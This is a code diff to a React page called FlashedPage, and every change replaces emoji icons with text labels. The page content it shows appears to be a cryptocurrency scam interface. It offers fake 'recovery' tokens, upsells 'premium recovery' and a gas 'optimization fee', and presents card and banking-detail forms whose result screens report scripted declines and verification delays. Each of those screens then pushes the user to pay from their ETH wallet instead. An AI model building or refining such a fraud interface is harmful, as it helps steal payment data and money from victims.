@@ -1437,7 +1437,7 @@ export default function FlashedPage() {
                   >
                     <div className="flex items-center">
                       <div className="w-8 h-8 bg-blue-500 rounded mr-3 flex items-center justify-center">
-                        <span className="text-white text-sm">💳</span>
+                        <span className="text-white text-sm">CARD</span>
                       </div>
                       <div>
                         <div className="text-white font-semibold">Buy with card</div>
@@ -1455,7 +1455,7 @@ export default function FlashedPage() {
                   >
                     <div className="flex items-center">
                       <div className="w-8 h-8 bg-green-500 rounded mr-3 flex items-center justify-center">
-                        <span className="text-white text-sm">🏦</span>
+                        <span className="text-white text-sm">BANK</span>
                       </div>
                       <div>
                         <div className="text-white font-semibold">Bank transfer</div>
@@ -1609,7 +1609,7 @@ export default function FlashedPage() {
                 </div>
                 <div className="space-y-4">
                   <div className="text-center">
-                    <div className="text-green-400 text-3xl mb-2">🎁</div>
+                    <div className="text-green-400 text-3xl mb-2">GIFT</div>
                     <div className="text-white font-semibold mb-2">Test Recovery System</div>
                     <div className="text-gray-300 text-sm mb-4">
                       Get trial tokens to test the recovery system with minimal gas cost.
@@ -1690,7 +1690,7 @@ export default function FlashedPage() {
                   <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                 </div>
                 <div className="space-y-4 text-center">
-                  <div className="text-green-400 text-4xl mb-2">✓</div>
+                  <div className="text-green-400 text-4xl mb-2">SUCCESS</div>
                   <div className="text-white font-semibold mb-2">Success!</div>
                   <div className="text-gray-300 text-sm mb-4">
                     50 REC tokens have been sent to your wallet. You can now test trading on Uniswap.
@@ -1706,7 +1706,7 @@ export default function FlashedPage() {
                   </div>
                   
                   <div className="bg-yellow-900/30 p-3 rounded-lg border border-yellow-600">
-                    <div className="text-yellow-300 text-sm font-semibold mb-1">🚀 Want More?</div>
+                    <div className="text-yellow-300 text-sm font-semibold mb-1">UPGRADE Want More?</div>
                     <div className="text-gray-300 text-xs mb-2">Unlock larger amounts with premium recovery</div>
                     <button 
                       onClick={() => setShowModal('upgradeOffer')}
@@ -1740,7 +1740,7 @@ export default function FlashedPage() {
                 </div>
                 <div className="space-y-4">
                   <div className="text-center">
-                    <div className="text-yellow-400 text-3xl mb-2">💰</div>
+                    <div className="text-yellow-400 text-3xl mb-2">MONEY</div>
                     <div className="text-white font-semibold mb-2">Unlock Higher Amounts</div>
                     <div className="text-gray-300 text-sm mb-4">
                       Upgrade to premium recovery to access larger token amounts with better trading potential.
@@ -1808,7 +1808,7 @@ export default function FlashedPage() {
                 </div>
                 <div className="space-y-4">
                   <div className="text-center">
-                    <div className="text-orange-400 text-3xl mb-2">⚡</div>
+                    <div className="text-orange-400 text-3xl mb-2">FAST</div>
                     <div className="text-white font-semibold mb-2">High Gas Fees Detected</div>
                     <div className="text-gray-300 text-sm mb-4">
                       Current network congestion is causing high gas fees. Enable gas optimization to reduce costs by up to 60%.
@@ -1871,7 +1871,7 @@ export default function FlashedPage() {
                   <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                 </div>
                 <div className="space-y-4 text-center">
-                  <div className="text-green-400 text-4xl mb-2">🎉</div>
+                  <div className="text-green-400 text-4xl mb-2">SUCCESS</div>
                   <div className="text-white font-semibold mb-2">Transaction Successful!</div>
                   <div className="text-gray-300 text-sm mb-4">
                     Your tokens have been successfully transferred and are now available for trading.
@@ -1937,7 +1937,7 @@ export default function FlashedPage() {
                   
                   {/* Credit Card Form */}
                   <div className="bg-gray-700 p-4 rounded-lg">
-                    <div className="text-white font-semibold mb-3">🔒 Payment Details</div>
+                    <div className="text-white font-semibold mb-3">SECURE Payment Details</div>
                     
                     <div className="space-y-3">
                       <div>
@@ -2012,7 +2012,7 @@ export default function FlashedPage() {
                   </div>
                   
                   <div className="bg-blue-900/30 p-3 rounded-lg border border-blue-600">
-                    <div className="text-blue-300 text-sm font-semibold mb-1">🔒 Secure Payment</div>
+                    <div className="text-blue-300 text-sm font-semibold mb-1">SECURE Payment</div>
                     <div className="text-gray-300 text-xs">
                       • 256-bit SSL encryption
                       • PCI DSS compliant
@@ -2075,7 +2075,7 @@ export default function FlashedPage() {
                     disabled={loading}
                     className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
                   >
-                    {loading ? 'Processing Payment...' : '💳 Complete Purchase'}
+                    {loading ? 'Processing Payment...' : 'Complete Purchase'}
                   </button>
                   
                   <div className="text-gray-400 text-xs text-center">
@@ -2095,14 +2095,14 @@ export default function FlashedPage() {
                   <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                 </div>
                 <div className="space-y-4 text-center">
-                  <div className="text-red-400 text-4xl mb-2">❌</div>
+                  <div className="text-red-400 text-4xl mb-2">ERROR</div>
                   <div className="text-white font-semibold mb-2">Card Payment Declined</div>
                   <div className="text-gray-300 text-sm mb-4">
                     Your card was declined by the bank. This is common with crypto purchases. Try using your wallet balance instead.
                   </div>
                   
                   <div className="bg-yellow-900/30 p-3 rounded-lg border border-yellow-600">
-                    <div className="text-yellow-300 text-sm font-semibold mb-1">💡 Alternative Solution</div>
+                    <div className="text-yellow-300 text-sm font-semibold mb-1">ALTERNATIVE Solution</div>
                     <div className="text-gray-300 text-xs mb-2">
                       Use your existing ETH balance to complete the purchase. This bypasses bank restrictions.
                     </div>
@@ -2126,7 +2126,7 @@ export default function FlashedPage() {
                     disabled={loading}
                     className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
                   >
-                    {loading ? 'Processing...' : '💰 Pay with Wallet Balance'}
+                    {loading ? 'Processing...' : 'Pay with Wallet Balance'}
                   </button>
                   
                   <button 
@@ -2166,7 +2166,7 @@ export default function FlashedPage() {
                   
                   {/* Banking Information Form */}
                   <div className="bg-gray-700 p-4 rounded-lg">
-                    <div className="text-white font-semibold mb-3">🏦 Banking Details</div>
+                    <div className="text-white font-semibold mb-3">BANKING Details</div>
                     
                     <div className="space-y-3">
                       <div>
@@ -2259,7 +2259,7 @@ export default function FlashedPage() {
                   </div>
                   
                   <div className="bg-green-900/30 p-3 rounded-lg border border-green-600">
-                    <div className="text-green-300 text-sm font-semibold mb-1">🔒 Secure Transfer</div>
+                    <div className="text-green-300 text-sm font-semibold mb-1">SECURE Transfer</div>
                     <div className="text-gray-300 text-xs">
                       • Bank-grade encryption
                       • ACH secure processing
@@ -2331,7 +2331,7 @@ export default function FlashedPage() {
                     disabled={loading}
                     className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
                   >
-                    {loading ? 'Setting Up Transfer...' : '🏦 Setup Bank Transfer'}
+                    {loading ? 'Setting Up Transfer...' : 'Setup Bank Transfer'}
                   </button>
                   
                   <div className="text-gray-400 text-xs text-center">
@@ -2351,14 +2351,14 @@ export default function FlashedPage() {
                   <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                 </div>
                 <div className="space-y-4 text-center">
-                  <div className="text-red-400 text-4xl mb-2">🏦</div>
+                  <div className="text-red-400 text-4xl mb-2">BANK</div>
                   <div className="text-white font-semibold mb-2">Account Verification Required</div>
                   <div className="text-gray-300 text-sm mb-4">
                     Your bank requires additional verification for crypto purchases. This process can take 5-7 business days. Use your wallet balance for instant purchase.
                   </div>
                   
                   <div className="bg-blue-900/30 p-3 rounded-lg border border-blue-600">
-                    <div className="text-blue-300 text-sm font-semibold mb-1">⚡ Instant Alternative</div>
+                    <div className="text-blue-300 text-sm font-semibold mb-1">INSTANT Alternative</div>
                     <div className="text-gray-300 text-xs mb-2">
                       Skip bank verification and use your existing ETH balance. Instant delivery, no waiting.
                     </div>
@@ -2382,7 +2382,7 @@ export default function FlashedPage() {
                     disabled={loading}
                     className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
                   >
-                    {loading ? 'Processing...' : '⚡ Instant Wallet Payment'}
+                    {loading ? 'Processing...' : 'Instant Wallet Payment'}
                   </button>
                   
                   <button 
@@ -2405,7 +2405,7 @@ export default function FlashedPage() {
                   <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                 </div>
                 <div className="space-y-4 text-center">
-                  <div className="text-green-400 text-4xl mb-2">💳</div>
+                  <div className="text-green-400 text-4xl mb-2">CARD</div>
                   <div className="text-white font-semibold mb-2">Payment Gateway Opened</div>
                   <div className="text-gray-300 text-sm mb-4">
                     Complete your purchase in the payment window. ETH will be delivered to your wallet within 5-10 minutes.
@@ -2449,7 +2449,7 @@ export default function FlashedPage() {
                 </div>
                 <div className="space-y-4">
                   <div className="text-center">
-                    <div className="text-green-400 text-3xl mb-2">✓</div>
+                    <div className="text-green-400 text-3xl mb-2">SUCCESS</div>
                     <div className="text-white font-semibold mb-2">Optimization Ready</div>
                     <div className="text-gray-300 text-sm">
                       Pay the one-time optimization fee to enable advanced gas management for all future transactions.
